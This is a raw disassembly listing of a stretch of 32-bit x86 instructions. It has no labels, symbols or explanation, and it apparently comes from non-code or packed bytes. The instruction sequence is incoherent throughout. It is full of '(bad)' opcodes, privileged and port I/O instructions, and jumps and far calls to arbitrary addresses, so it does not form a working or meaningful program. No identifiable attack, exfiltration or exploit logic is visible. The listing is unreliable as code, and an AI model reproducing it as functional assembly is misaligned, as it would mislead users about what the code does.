  4af25f:	ret    0x6f8e
  4af262:	fld    TBYTE PTR [edi+eax*8+0x70]
  4af266:	inc    eax
  4af267:	mov    eax,0x4b9dda16
  4af26c:	add    eax,0xd14f86a5
  4af271:	jo     0x4af262
  4af273:	sub    ecx,ecx
  4af275:	clc    
  4af276:	pop    edi
  4af277:	(bad)  
  4af278:	pop    ds
  4af279:	add    DWORD PTR [ebx],ecx
  4af27b:	jmp    0x4af20f
  4af27d:	lock push ebx
  4af27f:	pop    edi
  4af280:	xchg   ebx,eax
  4af281:	enter  0x844,0x56
  4af285:	outs   dx,DWORD PTR ds:[esi]
  4af286:	add    al,0xe9
  4af288:	cmp    BYTE PTR [ebx],al
  4af28a:	push   0xffffff96
  4af28c:	push   ebp
  4af28d:	and    al,0xd8
  4af28f:	nop
  4af290:	dec    ebx
  4af291:	lahf   
  4af292:	outs   dx,BYTE PTR ds:[esi]
  4af293:	push   ecx
  4af294:	div    DWORD PTR [esi+0x71]
  4af297:	push   0xd76e0420
  4af29c:	cmp    eax,DWORD PTR [eiz*1+0x2cf847d6]
  4af2a3:	xor    dh,BYTE PTR [ebx+0x681329dd]
  4af2a9:	sub    al,0x39
  4af2ab:	sete   BYTE PTR [eax+0x41]
  4af2af:	dec    esp
  4af2b0:	sbb    DWORD PTR [ecx],edi
  4af2b2:	mov    ecx,0xb3851e4
  4af2b7:	push   esp
  4af2b8:	loop   0x4af254
  4af2ba:	dec    eax
  4af2bb:	popa   
  4af2bc:	arpl   WORD PTR [eax],di
  4af2be:	outs   dx,DWORD PTR ds:[esi]
  4af2bf:	mov    bh,BYTE PTR [eax+0x60]
  4af2c2:	dec    esi
  4af2c3:	jne    0x4af2f7
  4af2c5:	inc    ebp
  4af2c6:	xor    BYTE PTR [ecx-0x4056537d],dh
  4af2cc:	xchg   BYTE PTR [ebx],cl
  4af2ce:	pop    ebx
  4af2cf:	clc    
  4af2d0:	jl     0x4af319
  4af2d2:	mov    gs,WORD PTR [eax+0x10]
  4af2d5:	cmp    ecx,DWORD PTR [eax+edi*1+0x38]
  4af2d9:	jmp    0x4af2dc
  4af2db:	push   edi
  4af2dc:	sbb    DWORD PTR [eax+0x48],eax
  4af2df:	mov    dh,0x4b
  4af2e1:	push   edx
  4af2e2:	scas   eax,DWORD PTR es:[edi]
  4af2e3:	push   0x40
  4af2e5:	and    eax,0xf424570a
  4af2ea:	and    ch,BYTE PTR ds:0x415093d3
  4af2f0:	mov    ebp,0x5c08fb1
  4af2f5:	sub    DWORD PTR [ebx+0x471954c],esp
  4af2fb:	mov    dl,0x37
  4af2fd:	push   0xffffff8f
  4af2ff:	inc    ecx
  4af300:	mov    al,ds:0x25db0f76
  4af305:	aaa    
  4af306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4af307:	xor    BYTE PTR [edi+0x4e],0x5d
  4af30b:	js     0x4af2a3
  4af30d:	sub    BYTE PTR [ebp-0x6a],ah
  4af310:	arpl   WORD PTR [esi+0x4aa8d97e],ax
  4af316:	ret    
  4af317:	dec    esi
  4af318:	jmp    0x4af36b
  4af31a:	push   edx
  4af31b:	fs jbe 0x4af2b3
  4af31e:	mul    BYTE PTR ds:0x5b869f32
  4af324:	push   edx
  4af325:	push   0xcb42378e
  4af32a:	add    al,0x93
  4af32c:	pop    eax
  4af32d:	inc    ebx
  4af32e:	dec    ecx
  4af32f:	sbb    ch,bl
  4af331:	sub    esi,ebp
  4af333:	add    al,0x94
  4af335:	jo     0x4af362
  4af337:	int3   
  4af338:	pop    es
  4af339:	test   DWORD PTR [esi+ebx*8],0x4d5475be
  4af340:	es (bad) 
  4af342:	sub    ah,ch
  4af344:	dec    ebx
  4af345:	adc    al,0x6c
  4af347:	xchg   DWORD PTR [eax],ecx
  4af349:	aaa    
  4af34a:	je     0x4af389
  4af34c:	adc    dl,BYTE PTR [esi]
  4af34e:	nop
  4af34f:	dec    ebx
  4af350:	icebp  
  4af351:	add    ebx,eax
  4af353:	dec    eax
  4af354:	js     0x4af301
  4af356:	(bad)  
  4af357:	xlat   BYTE PTR ds:[ebx]
  4af358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4af359:	mov    dh,0x10
  4af35b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4af35c:	jle    0x4af376
  4af35e:	xchg   ebp,eax
  4af35f:	jmp    0x4af377
  4af361:	mov    BYTE PTR [edx+edx*8],dh
  4af364:	xor    BYTE PTR [edi-0x2f],cl
  4af367:	and    eax,0xe43d01ac
  4af36c:	push   edx
  4af36d:	cs pop edx
  4af36f:	cmp    al,BYTE PTR [ebp-0x7e9bb945]
  4af375:	fbld   TBYTE PTR [esi]
  4af377:	push   cs
  4af378:	xchg   esp,eax
  4af379:	(bad)  
  4af37a:	ds xchg esi,esp
  4af37d:	or     eax,0x707c12e2
  4af382:	add    DWORD PTR [edx+0x68],eax
  4af385:	dec    eax
  4af386:	add    eax,0x18d3ffd4
  4af38b:	jb     0x4af321
  4af38d:	mov    ch,0x82
  4af38f:	out    0xdb,al
  4af391:	ins    BYTE PTR es:[edi],dx
  4af392:	rol    DWORD PTR [ebx+0x34a9a50d],cl
  4af398:	sti    
  4af399:	xchg   esi,eax
  4af39a:	add    DWORD PTR [esi+0x423c1a88],eax
  4af3a0:	sub    WORD PTR [ebx-0x73],bp
  4af3a4:	dec    esi
  4af3a5:	js     0x4af368
  4af3a7:	daa    
  4af3a8:	inc    eax
  4af3a9:	mov    ch,0xd
  4af3ab:	xor    al,al
  4af3ad:	push   eax
  4af3ae:	popa   
  4af3af:	push   ecx
  4af3b0:	rcr    bh,cl
  4af3b2:	test   dh,dh
  4af3b4:	adc    al,0xe1
  4af3b6:	fdiv   st,st(1)
  4af3b9:	pusha  
  4af3ba:	adc    al,0x14
  4af3bc:	add    BYTE PTR [edi],0x47
  4af3bf:	and    eax,0x4cf568d
  4af3c4:	push   edx
  4af3c5:	pusha  
  4af3c6:	sbb    BYTE PTR [esi+0x2f],0x53
  4af3ca:	mov    esp,0xa099de58
  4af3cf:	push   es
  4af3d0:	imul   edi,DWORD PTR [edx],0xfffffffa
  4af3d3:	pop    ss
  4af3d4:	sbb    cl,BYTE PTR [edx+0x6f138893]
  4af3da:	hlt    
  4af3db:	xor    bl,bh
  4af3dd:	retf   0xd91c
  4af3e0:	pop    ebx
  4af3e1:	rol    BYTE PTR [ebx+0x5c],0xcb
  4af3e5:	add    eax,0x2757c403
  4af3ea:	test   BYTE PTR [ecx-0x46f36fa9],ch
  4af3f0:	pop    es
  4af3f1:	or     al,0x39
  4af3f3:	mov    edx,0x6507d688
  4af3f8:	jl     0x4af447
  4af3fa:	cmp    eax,0x3ca4df8a
  4af3ff:	fmul   st,st(0)
  4af401:	xor    al,BYTE PTR [edx-0x75d78af8]
  4af407:	nop
  4af408:	add    BYTE PTR [esi-0x7f],ah
  4af40b:	jo     0x4af3a4
  4af40d:	sbb    al,0x70
  4af40f:	xor    ah,dl
  4af411:	das    
  4af412:	je     0x4af422
  4af414:	je     0x4af41f
  4af416:	adc    BYTE PTR [edi],al
  4af418:	pop    ss
  4af419:	popa   
  4af41a:	or     ebx,DWORD PTR [edx+0x5ee17870]
  4af420:	sahf   
  4af421:	inc    ebx
  4af422:	mov    bh,0x9
  4af424:	ja     0x4af420
  4af426:	push   0xffffff98
  4af428:	cmp    edi,DWORD PTR [esi-0x4a]
  4af42b:	xchg   DWORD PTR [eax-0x4ac3cb34],eax
  4af431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4af432:	shr    DWORD PTR [ecx+ecx*1+0x2c],1
  4af436:	push   ss
  4af437:	jge    0x4af41d
  4af439:	fsubp  st(1),st
  4af43b:	sub    al,0x38
  4af43d:	and    DWORD PTR [ecx],eax
  4af43f:	and    al,0x47
  4af441:	sub    dl,BYTE PTR [ecx+0x7f]
  4af444:	or     bh,BYTE PTR [edx-0x4fe8d469]
  4af44a:	test   eax,0x8d172c6a
  4af44f:	xlat   BYTE PTR ds:[ebx]
  4af450:	or     bh,BYTE PTR [edx+edx*1]
  4af453:	sbb    dh,bh
  4af455:	or     BYTE PTR [edi],dh
  4af457:	lea    eax,[ebp+0x2]
  4af45a:	mov    al,ds:0x29609c3
  4af45f:	pushf  
  4af460:	repz pop es
  4af462:	push   0x1a
  4af464:	iret   
  4af465:	aas    
  4af466:	cmp    al,0x44
  4af468:	sub    eax,0x77c18b58
  4af46d:	mov    al,ds:0x16d62271
  4af472:	dec    esp
  4af473:	mov    eax,0x9706d2b7
  4af478:	out    0x44,eax
  4af47a:	xchg   BYTE PTR [ebx],bh
  4af47c:	mov    cl,0xc
  4af47e:	and    BYTE PTR [ecx],0x84
  4af481:	dec    eax
  4af482:	xchg   edi,eax
  4af483:	test   al,0x23
  4af485:	ds pushf 
  4af487:	dec    edi
  4af488:	adc    ecx,DWORD PTR [edi]
  4af48a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4af48b:	mov    BYTE PTR [eax],bl
  4af48d:	jmp    DWORD PTR [ebp+0xfe0837b]
  4af493:	jne    0x4af428
  4af495:	adc    al,0x40
  4af497:	jne    0x4af4d4
  4af499:	inc    esi
  4af49a:	test   BYTE PTR [ebx+eiz*8],0x7e
  4af49e:	lds    esp,FWORD PTR [ebp+0xa3669e6]
  4af4a4:	or     eax,0x74d78cbc
  4af4a9:	(bad)  
  4af4aa:	ins    BYTE PTR es:[edi],dx
  4af4ab:	pop    DWORD PTR fs:[esi]
  4af4ae:	adc    al,0x31
  4af4b0:	push   ecx
  4af4b1:	sub    edx,edx
  4af4b3:	and    ebp,ebp
  4af4b5:	or     edi,DWORD PTR [ecx+0x74]
  4af4b8:	sub    al,0x50
  4af4ba:	dec    esp
  4af4bb:	cwde   
  4af4bc:	and    DWORD PTR [ebx+0x18639317],ecx
  4af4c2:	jnp    0x4af4d4
  4af4c4:	cmp    al,0x3d
  4af4c6:	push   fs
  4af4c8:	aaa    
  4af4c9:	ret    
  4af4ca:	push   0x1a
  4af4cc:	repz or DWORD PTR [ebx+0x60ae2be3],ecx
  4af4d3:	mov    ecx,0x1f335ef7
  4af4d8:	xchg   cl,bl
  4af4da:	les    eax,FWORD PTR [ebp*2-0x5f8aa4e5]
  4af4e1:	leave  
  4af4e2:	nop
  4af4e3:	xchg   ch,dl
  4af4e5:	cwde   
  4af4e6:	into   
  4af4e7:	inc    ebp
  4af4e8:	jecxz  0x4af497
  4af4ea:	repnz pop esp
  4af4ec:	inc    eax
  4af4ed:	clc    
  4af4ee:	dec    eax
  4af4ef:	gs jge 0x4af4c2
  4af4f2:	sub    ch,BYTE PTR ds:0x89492da9
  4af4f8:	xchg   DWORD PTR [ebp-0x71],ecx
  4af4fb:	(bad)  
  4af4fc:	sub    al,0x61
  4af4fe:	std    
  4af4ff:	jl     0x4af48a
  4af501:	xchg   DWORD PTR [eax+0x50579c87],ecx
  4af507:	scas   eax,DWORD PTR es:[edi]
  4af508:	dec    edi
  4af509:	xor    eax,0x3c43083a
  4af50e:	or     eax,0x593190bb
  4af513:	xor    BYTE PTR [eax+ecx*1-0x4c],al
  4af517:	and    BYTE PTR [ebx-0xcd9042a],cl
  4af51d:	mov    ecx,DWORD PTR [ecx-0x5f098275]
  4af523:	or     esi,ebx
  4af525:	dec    edx
  4af526:	or     BYTE PTR [ebx],dl
  4af528:	shl    BYTE PTR [eax],0x81
  4af52b:	xor    dl,ah
  4af52d:	(bad)  
  4af52e:	mov    ?,WORD PTR [edx+0x3d]
  4af531:	mov    cl,0xb
  4af533:	js     0x4af5a0
  4af535:	xor    BYTE PTR [eax+eax*8+0x41de75d2],0xa2
  4af53d:	dec    esp
  4af53e:	mov    bh,0x8b
  4af540:	ins    BYTE PTR es:[edi],dx
  4af541:	and    BYTE PTR [ebx+0x7b83a723],ch
  4af547:	mov    edi,0xe71458d1
  4af54c:	ins    DWORD PTR es:[edi],dx
  4af54d:	mov    ebx,0x415829bc
  4af552:	inc    edx
  4af553:	or     eax,DWORD PTR [esi+0x67]
  4af556:	cs add al,0xe2
  4af559:	jl     0x4af53d
  4af55b:	xor    DWORD PTR [ebp-0x2d],0xf4cb2042
  4af562:	repz and BYTE PTR [ebx-0x3e3beeab],dh
  4af569:	mov    bl,BYTE PTR [ebx]
  4af56b:	mov    dh,0x1c
  4af56d:	add    al,0x82
  4af56f:	sbb    ebp,DWORD PTR [ecx+0x4b]
  4af572:	adc    ebp,edi
  4af574:	enter  0xdde8,0x1e
  4af578:	fs inc esp
  4af57a:	mov    ebp,0xfe06763a
  4af57f:	ins    DWORD PTR es:[edi],dx
  4af580:	std    
  4af581:	add    al,0x6f
  4af583:	into   
  4af584:	ror    BYTE PTR [eax],1
  4af586:	mov    ecx,0x1f70755f
  4af58b:	mov    BYTE PTR [ebp+0x64262255],ah
  4af591:	push   ss
  4af592:	add    BYTE PTR [ecx+0x52da5015],0x58
  4af599:	data16 mov dl,BYTE PTR [ebx+0x63]
  4af59d:	out    0x8a,al
  4af59f:	inc    esi
  4af5a0:	mul    BYTE PTR [esi-0x1]
  4af5a3:	mov    BYTE PTR [eax+0x1602f489],al
  4af5a9:	popa   
  4af5aa:	or     eax,0x6ce10553
  4af5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4af5b0:	dec    edi
  4af5b1:	jbe    0x4af53d
  4af5b3:	sbb    BYTE PTR [ecx+0x44],0xca
  4af5b7:	and    BYTE PTR [ebp+0x0],dh
  4af5ba:	jecxz  0x4af5a4
  4af5bc:	aaa    
  4af5bd:	adc    eax,0x690c715f
  4af5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4af5c3:	mov    bh,BYTE PTR ds:0x96d07483
  4af5c9:	js     0x4af5da
  4af5cb:	mov    ss,WORD PTR [eax+0x2c418b50]
  4af5d1:	mov    al,0xf8
  4af5d3:	imul   eax,DWORD PTR [eax+0x22],0x3b873b0a
  4af5da:	test   al,0xeb
  4af5dc:	adc    eax,0x72d2361b
  4af5e1:	sbb    BYTE PTR [ebp-0xd],dh
  4af5e4:	pop    esp
  4af5e5:	mov    eax,DWORD PTR [esi+0x58]
  4af5e8:	pop    esi
  4af5e9:	add    eax,0x3c5710a3
  4af5ee:	mov    eax,ds:0xc658800d
  4af5f3:	sub    ebp,0xffffffa6
  4af5f6:	mov    ebx,esi
  4af5f8:	xor    al,0xd
  4af5fa:	jmp    FWORD PTR [ecx+0x1149018e]
  4af600:	nop
  4af601:	cwde   
  4af602:	nop
  4af603:	sub    eax,0xf53e2969
  4af608:	mov    DWORD PTR [edx],ebx
  4af60a:	cmp    BYTE PTR [eax+0x113430e1],dh
  4af610:	inc    edx
  4af611:	fistp  QWORD PTR [ecx-0x50]
  4af614:	mov    eax,ds:0x342a3d7c
  4af619:	and    BYTE PTR [edx],bh
  4af61b:	out    dx,al
  4af61c:	xor    BYTE PTR [eax+0x14],dh
  4af61f:	mov    edx,0xc13b3049
  4af624:	mov    edx,0x1fb4c0c7
  4af629:	mov    esi,0x2124ed80
  4af62e:	les    edx,FWORD PTR [ebx]
  4af630:	push   0x42d4ae30
  4af635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4af636:	out    dx,al
  4af637:	xchg   edx,eax
  4af638:	gs push eax
  4af63a:	sbb    bl,BYTE PTR [ecx]
  4af63c:	ins    DWORD PTR es:[edi],dx
  4af63d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4af63e:	sub    ecx,edi
  4af640:	jno    0x4af5f8
  4af642:	push   es
  4af643:	sbb    cl,cl
  4af645:	dec    esp
  4af646:	retf   0x603a
  4af649:	dec    esp
  4af64a:	xor    BYTE PTR [edx],ah
  4af64c:	retf   0xa98c
  4af64f:	ja     0x4af69c
  4af651:	icebp  
  4af652:	inc    eax
  4af653:	lods   eax,DWORD PTR ds:[esi]
  4af654:	fs cs ret 0xde01
  4af659:	shl    BYTE PTR [ebp+0x53339217],1
  4af65f:	sbb    ecx,DWORD PTR [esi]
  4af661:	jo     0x4af5e3
  4af663:	mov    al,0xff
  4af665:	fistp  DWORD PTR [ebx+0x53]
  4af668:	xchg   DWORD PTR [esi],edx
  4af66a:	xor    bh,BYTE PTR [esi]
  4af66c:	jo     0x4af66c
  4af66e:	aaa    
  4af66f:	or     al,0x49
  4af671:	(bad)  
  4af672:	in     eax,0x19
  4af674:	mov    BYTE PTR [eax],0x18
  4af677:	sbb    dh,BYTE PTR [eax]
  4af679:	ret    
  4af67a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4af67b:	test   ebp,ecx
  4af67d:	mov    eax,0xd280e092
  4af682:	sahf   
  4af683:	dec    ecx
  4af684:	dec    esp
  4af685:	dec    eax
  4af686:	inc    ecx
  4af687:	pop    eax
  4af688:	add    al,0x8d
  4af68a:	add    al,0xe8
  4af68c:	cs cmp ebx,ecx
  4af68f:	mov    ds:0x2f55d721,eax
  4af694:	adc    BYTE PTR [ebp-0x372d9051],al
  4af69a:	jne    0x4af6e1
  4af69c:	sbb    ch,BYTE PTR [edi]
  4af69e:	jle    0x4af6af
  4af6a0:	pop    edx
  4af6a1:	or     ah,BYTE PTR [ebx]
  4af6a3:	test   al,0xf
  4af6a5:	push   edx
  4af6a6:	cwde   
  4af6a7:	enter  0x5213,0xeb
  4af6ab:	push   0xffffffd9
  4af6ad:	mov    eax,0x5be2a42
  4af6b2:	ds das 
  4af6b4:	jmp    0x4af71c
  4af6b6:	adc    BYTE PTR [esi+edi*1],bh
  4af6b9:	retf   0x1c51
  4af6bc:	sbb    ch,BYTE PTR [ecx]
  4af6be:	sbb    esp,DWORD PTR [ecx]
  4af6c0:	dec    eax
  4af6c1:	xchg   BYTE PTR [eax],al
  4af6c3:	or     eax,0x112913f8
  4af6c8:	push   ebp
  4af6c9:	imul   ecx,DWORD PTR [ecx-0x744d38c8],0xffffffa4
  4af6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4af6d1:	mov    edx,esi
  4af6d3:	inc    eax
  4af6d4:	and    ebx,DWORD PTR [edx]
  4af6d6:	pusha  
  4af6d7:	dec    ecx
  4af6d8:	pop    es
  4af6d9:	and    cl,BYTE PTR [ecx*4-0x39dfb3a5]
  4af6e0:	inc    ax
  4af6e2:	ins    DWORD PTR es:[edi],dx
  4af6e3:	outs   dx,DWORD PTR ds:[esi]
  4af6e4:	push   0xd4b55651
  4af6e9:	pop    esi
  4af6ea:	sbb    al,0xc4
  4af6ec:	inc    edi
  4af6ed:	pusha  
  4af6ee:	xor    DWORD PTR [esi],esp
  4af6f0:	iret   
  4af6f1:	xchg   ebp,eax
  4af6f2:	fcom   DWORD PTR [ecx+eiz*1]
  4af6f5:	int    0x66
  4af6f7:	sti    
  4af6f8:	jg     0x4af6bd
  4af6fa:	nop
  4af6fb:	mov    al,ds:0xfa004556
  4af700:	push   edx
  4af701:	push   es
  4af702:	jg     0x4af757
  4af704:	push   0xd3cff551
  4af709:	ins    BYTE PTR es:[edi],dx
  4af70a:	ds enter 0xed56,0x55
  4af70f:	xor    DWORD PTR [eax+0x79f30016],ebp
  4af715:	call   0x8057:0x25be0756
  4af71c:	bound  eax,QWORD PTR es:[edi]
  4af71f:	xchg   ebx,eax
  4af720:	xchg   esi,eax
  4af721:	or     al,0xac
  4af723:	add    BYTE PTR [eax+0xcfc1a26],dh
  4af729:	or     DWORD PTR [eax],ecx
  4af72b:	jecxz  0x4af72d
  4af72d:	rcr    BYTE PTR [esi-0x239745fa],0xa9
  4af734:	inc    eax
  4af735:	jg     0x4af74f
  4af737:	push   ebp
  4af738:	sbb    BYTE PTR [esp+esi*1-0x55],dl
  4af73c:	add    al,0xa
  4af73e:	pop    esi
  4af73f:	pop    eax
  4af740:	sub    edx,DWORD PTR [ebx+0x10]
  4af743:	ja     0x36d07758
  4af749:	xchg   BYTE PTR [esi+0x543cad88],al
  4af74f:	fisubr DWORD PTR [ebx+0x48c00e8e]
  4af755:	push   esi
  4af756:	cmp    al,0xf
  4af758:	push   cs
  4af759:	inc    eax
  4af75a:	or     al,0x34
  4af75c:	xchg   ebp,eax
  4af75d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4af75e:	sar    BYTE PTR [eax],cl
  4af760:	or     DWORD PTR [eax],esi
  4af762:	adc    al,0x28
  4af764:	sub    cl,BYTE PTR [ebp-0x5b]
  4af767:	test   eax,0x181d2011
  4af76c:	sbb    esp,ecx
  4af76e:	sub    al,0x53
  4af770:	imul   edx,DWORD PTR [eax],0x1f2215
  4af776:	push   ecx
  4af777:	ins    BYTE PTR es:[edi],dx
  4af778:	clc    
  4af779:	sbb    al,0xc5
  4af77b:	stos   BYTE PTR es:[edi],al
  4af77c:	or     ecx,esp
  4af77e:	inc    eax
  4af77f:	mov    ch,0x38
  4af781:	adc    DWORD PTR [edx],ebx
  4af783:	xor    al,BYTE PTR [ebp+0x10]
  4af786:	aam    0x2c
  4af788:	popa   
  4af789:	mov    edi,0x6d61c04
  4af78e:	pop    esp
  4af78f:	push   ebp
  4af790:	loopne 0x4af7a0
  4af792:	inc    eax
  4af793:	pop    ds
  4af794:	or     al,0x3c
  4af796:	shr    BYTE PTR [esi+0x5d],1
  4af799:	in     al,0xa5
  4af79b:	adc    eax,0x5ac74b81
  4af7a0:	add    ebx,DWORD PTR [esi]
  4af7a2:	pusha  
  4af7a3:	xor    BYTE PTR [eax+ebx*2-0x59f5d877],ah
  4af7aa:	add    BYTE PTR [eax-0x60ab2723],al
  4af7b0:	hlt    
  4af7b1:	dec    ebx
  4af7b2:	pusha  
  4af7b3:	sbb    edx,0x78
  4af7b6:	dec    esp
  4af7b7:	cmp    DWORD PTR ss:[eax+0x54],0x0
  4af7bc:	jo     0x4af815
  4af7be:	cld    
  4af7bf:	add    bl,bl
  4af7c1:	push   edi
  4af7c2:	add    eax,0x61ebdb0d
  4af7c7:	add    BYTE PTR [edi+0x16],dh
  4af7ca:	hlt    
  4af7cb:	aaa    
  4af7cc:	mov    bh,BYTE PTR [edi+0x18]
  4af7cf:	mov    bl,0x2d
  4af7d1:	popf   
  4af7d2:	adc    bh,ch
  4af7d4:	out    dx,al
  4af7d5:	and    ch,0x27
  4af7d8:	adc    al,0xd
  4af7da:	sbb    eax,eax
  4af7dc:	sub    BYTE PTR [eax+0xd],al
  4af7df:	add    ecx,DWORD PTR [esi]
  4af7e1:	xor    eax,0x98b1f182
  4af7e6:	push   eax
  4af7e7:	retf   0x8d48
  4af7ea:	call   0x2556801f
  4af7ef:	xor    DWORD PTR [ebx],ecx
  4af7f1:	jne    0x4af7f4
  4af7f3:	jp     0x4af825
  4af7f5:	(bad)  [ebp-0x2b]
  4af7f8:	add    dh,ch
  4af7fa:	xchg   esp,eax
  4af7fb:	test   BYTE PTR [ecx+0x681b4c79],0x50
  4af802:	add    eax,0xdb95e1d7
  4af807:	adc    DWORD PTR [ecx+eax*8-0x78],ebx
  4af80b:	in     eax,0x4
  4af80d:	pop    es
  4af80e:	cmp    BYTE PTR [edx-0x215a6f06],dh
  4af814:	(bad)  
  4af815:	(bad)  
  4af816:	inc    ebx
  4af817:	in     al,dx
  4af818:	mov    bh,0x32
  4af81a:	add    al,0xc2
  4af81c:	push   ebp
  4af81d:	int3   
  4af81e:	stos   DWORD PTR es:[edi],eax
  4af81f:	nop
  4af820:	pop    es
  4af821:	aam    0x39
  4af823:	mov    edx,DWORD PTR [ecx-0x9ecd184]
  4af829:	dec    BYTE PTR [edx+0x46]
  4af82c:	test   BYTE PTR [esi+0x50],al
  4af82f:	mov    DWORD PTR [esi+0x4c],edi
  4af832:	cdq    
  4af833:	cli    
  4af834:	ror    DWORD PTR [esi+0x1691f05],0xed
  4af83b:	retf   
  4af83c:	dec    eax
  4af83d:	or     dl,BYTE PTR [esi]
  4af83f:	pop    esp
  4af840:	push   ss
  4af841:	leave  
  4af842:	mov    esp,0x4d27c152
  4af847:	add    al,0x2b
  4af849:	aas    
  4af84a:	pusha  
  4af84b:	add    eax,0x3090209
  4af850:	inc    ebx
  4af851:	sbb    DWORD PTR [eax+0x67],0xf79799cc
  4af858:	xchg   edx,eax
  4af859:	adc    al,BYTE PTR [edx]
  4af85b:	adc    DWORD PTR [edx+0x66],0xd417d618
  4af862:	nop    ebx
  4af865:	or     eax,0x890d26b
  4af86a:	mov    dl,0x21
  4af86c:	daa    
  4af86d:	jne    0x4af7fa
  4af86f:	and    ch,cl
  4af871:	mov    ss,WORD PTR ss:[ecx-0xe]
  4af875:	mov    eax,0xa29e42e3
  4af87a:	bound  ecx,QWORD PTR [eax+ebx*4]
  4af87d:	adc    DWORD PTR [eax-0x3a],ecx
  4af880:	dec    edx
  4af881:	jl     0x4af8e6
  4af883:	sub    edi,DWORD PTR [ebx+0x5a]
  4af886:	or     BYTE PTR [ebx-0x480dc5cb],0x8b
  4af88d:	aaa    
  4af88e:	mul    BYTE PTR [edx-0x2cb19b1f]
  4af894:	aad    0x55
  4af896:	push   es
  4af897:	les    edx,FWORD PTR [ebp-0x4a]
  4af89a:	es das 
  4af89c:	mov    ebp,0x320c8161
  4af8a1:	push   cs
  4af8a2:	sbb    ch,ah
  4af8a4:	rcl    DWORD PTR [esi-0x5e],0xe1
  4af8a8:	inc    esp
  4af8a9:	ss sbb al,0xd6
  4af8ac:	xor    esi,DWORD PTR [eax]
  4af8ae:	push   es
  4af8af:	sub    BYTE PTR [ecx],ch
  4af8b1:	and    DWORD PTR [ebx+0x132b8af5],ebx
  4af8b7:	dec    esp
  4af8b8:	xchg   dl,dl
  4af8ba:	mov    ss,WORD PTR [eax+0x46]
  4af8bd:	mov    DWORD PTR [edx],ebp
  4af8bf:	sbb    edi,ebx
  4af8c1:	or     ah,ch
  4af8c3:	js     0x4af8cd
  4af8c5:	sbb    eax,0xf23647a9
  4af8ca:	ss and dl,bh
  4af8cd:	mov    cl,0xd1
  4af8cf:	add    eax,0x1333349
  4af8d4:	sub    DWORD PTR [esi-0x46adc547],edx
  4af8da:	retf   
  4af8db:	les    ebx,FWORD PTR [edx+0x48]
  4af8de:	xchg   edi,esi
  4af8e0:	or     al,0xa
  4af8e2:	mov    bl,0xa4
  4af8e4:	ffreep st(5)
  4af8e6:	je     0x4af940
  4af8e8:	push   ebp
  4af8e9:	ror    DWORD PTR [eax+0x31],cl
  4af8ec:	inc    ecx
  4af8ed:	dec    ebp
  4af8ee:	arpl   WORD PTR [ecx],bp
  4af8f0:	jmp    0x4af8d2
  4af8f2:	push   ds
  4af8f3:	push   eax
  4af8f4:	inc    edi
  4af8f5:	idiv   al
  4af8f7:	mov    dl,0x80
  4af8f9:	rcl    DWORD PTR [edx+0x52],0x5b
  4af8fd:	dec    edx
  4af8fe:	add    eax,0x508d6634
  4af903:	add    DWORD PTR [ecx],esi
  4af905:	mov    ch,0x79
  4af907:	fadd   st,st(5)
  4af909:	mov    ch,0xf5
  4af90b:	pop    ds
  4af90c:	and    al,0xa4
  4af90e:	mov    eax,ds:0xc704e406
  4af913:	or     BYTE PTR [ebx+ecx*1],al
  4af916:	fs push 0x394d6b
  4af91c:	xchg   ebp,eax
  4af91d:	(bad)  
  4af91e:	inc    ax
  4af920:	or     DWORD PTR [ebx+ecx*1+0x9],edi
  4af924:	les    ecx,FWORD PTR ds:0x44a01394
  4af92a:	ins    BYTE PTR es:[edi],dx
  4af92b:	jns    0x4af976
  4af92d:	adc    BYTE PTR [eax+0x6e18d6df],dl
  4af933:	xlat   BYTE PTR ds:[ebx]
  4af934:	ins    BYTE PTR es:[edi],dx
  4af935:	cmp    al,0x2f
  4af937:	mov    DWORD PTR [ebp+0x1c25f41b],0x944847d8
  4af941:	mov    DWORD PTR [ebx],edx
  4af943:	xchg   DWORD PTR [edi+0x8],eax
  4af946:	scas   eax,DWORD PTR es:[edi]
  4af947:	mov    bl,0x30
  4af949:	push   edx
  4af94a:	scas   al,BYTE PTR es:[edi]
  4af94b:	xor    dl,0xa2
  4af94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4af94f:	jb     0x4af97a
  4af951:	push   ss
  4af952:	add    eax,0x10cba71d
  4af957:	push   edx
  4af958:	dec    ecx
  4af959:	or     DWORD PTR [edi+0x2a],eax
  4af95c:	push   0xbe60bedc
  4af961:	dec    esp
  4af962:	push   eax
  4af963:	je     0x4af935
  4af965:	sub    ebp,DWORD PTR [eax-0x4c]
  4af968:	sbb    BYTE PTR ds:[eax-0x3b],dl
  4af96c:	mov    ch,0x70
  4af96e:	sub    ch,BYTE PTR [eax-0x7c]
  4af971:	fcomp  DWORD PTR [ebx-0x2f]
  4af974:	or     eax,0x48c30f07
  4af979:	cs cs push esi
  4af97c:	inc    ecx
  4af97d:	sbb    ebx,esp
  4af97f:	cs pop ebx
  4af981:	jnp    0x4af9bf
  4af983:	pop    ebx
  4af984:	push   esi
  4af985:	or     eax,0xc9eafeb3
  4af98a:	shl    BYTE PTR [ebx],1
  4af98c:	push   edi
  4af98d:	jmp    0x4af9a9
  4af98f:	sub    eax,0xc2466463
  4af994:	ret    0x4260
  4af997:	adc    esp,eax
  4af999:	jb     0x4af95e
  4af99b:	inc    eax
  4af99c:	push   edx
  4af99d:	lods   eax,DWORD PTR ds:[esi]
  4af99e:	inc    ecx
  4af99f:	std    
  4af9a0:	adc    BYTE PTR [ebx],cl
  4af9a2:	test   ecx,0x11fa056f
  4af9a8:	sub    al,0x58
  4af9aa:	add    DWORD PTR [edi-0x38],ecx
  4af9ad:	add    ebx,ebp
  4af9af:	or     al,0x22
  4af9b1:	fcmovnu st,st(2)
  4af9b3:	and    BYTE PTR [edx],dh
  4af9b5:	add    BYTE PTR [eax],dl
  4af9b7:	xchg   esp,eax
  4af9b8:	sub    esp,ecx
  4af9ba:	dec    edi
